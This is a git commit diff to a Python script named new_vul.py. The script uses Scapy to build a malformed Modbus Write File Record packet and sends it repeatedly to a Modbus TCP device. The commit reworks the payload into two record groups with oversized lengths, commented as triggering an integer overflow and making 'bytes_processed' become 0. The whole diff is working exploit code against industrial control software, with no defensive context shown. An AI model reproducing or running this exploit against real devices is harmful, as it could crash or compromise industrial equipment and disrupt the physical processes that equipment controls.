85e085697f0d077cfb2bf41c1dd4303e0641281a
zenon <mrz60606@gmail.com>
2024-07-03 12:43:46 +0800

    fix

--- new_vul.py
+++ new_vul.py
@@ -1,5 +1,5 @@
 from scapy.all import *
-from scapy.contrib.modbus import *
+load_contrib('modbus')
 import time
 import socket
 import struct
@@ -7,29 +7,42 @@ import struct
 def create_exploit_packet():
     # Modbus Write File Record header
     function_code = 0x15
-    byte_count = 0x0d  # 13 bytes of data
+    byte_count = 0x0d  # 13 bytes of data for first group
 
-    # Sub-request header
-    reference_type = 0x06
-    file_number = 0x0001
-    record_number = 0x0000
-    record_length = 0xfffe  # Trigger integer overflow
+    # First group
+    reference_type_1 = 0x06
+    file_number_1 = 0x0001
+    record_number_1 = 0x0000
+    record_length_1 = 0xfffe  # Trigger integer overflow
 
-    # Payload
+    # Second group (malicious)
+    reference_type_2 = 0x06
+    file_number_2 = 0x0002
+    record_number_2 = 0x0000
+    record_length_2 = 0xfffb  # Cause bytes_processed to become 0
+
+    # Construct payload
     payload = struct.pack('>BBHHHH', 
                           function_code,
                           byte_count,
-                          reference_type,
-                          file_number,
-                          record_number,
-                          record_length)
+                          reference_type_1,
+                          file_number_1,
+                          record_number_1,
+                          record_length_1)
     
-    # Add malicious second "group"
-    payload += struct.pack('>H', 0xfffb)
+    # Add data for first group (just zeros for simplicity)
+    payload += b'\x00\x00'  # Minimum 2 bytes of data
     
-    # Pad to reach minimum Modbus PDU length
-    payload += b'\x00' * (253 - len(payload))
-
+    # Add second group
+    payload += struct.pack('>BHHHH',
+                           reference_type_2,
+                           file_number_2,
+                           record_number_2,
+                           record_length_2)
+    
+    # Add data for second group (just zeros for simplicity)
+    payload += b'\x00\x00'  # Minimum 2 bytes of data
+    
     return payload
 
 exploit_packet = create_exploit_packet()
@@ -42,7 +55,7 @@ ss = StreamSocket(s, Raw)
 try:
     while True:
         # Create Modbus TCP packet with the exploit payload
-        modbus_tcp = ModbusTCP()/Raw(load=exploit_packet)
+        modbus_tcp = ModbusADURequest()/Raw(load=exploit_packet)
         
         # Send the packet and receive response
         response = ss.sr1(modbus_tcp)
